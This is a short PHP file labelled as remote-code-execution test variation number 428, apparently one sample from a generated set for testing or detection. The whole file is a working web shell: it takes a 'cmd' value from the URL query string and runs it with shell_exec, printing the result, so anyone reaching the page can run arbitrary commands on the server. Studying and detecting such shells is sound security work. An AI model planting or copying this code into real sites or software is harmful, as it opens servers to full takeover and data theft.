<?php
// RCE test variation #428
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>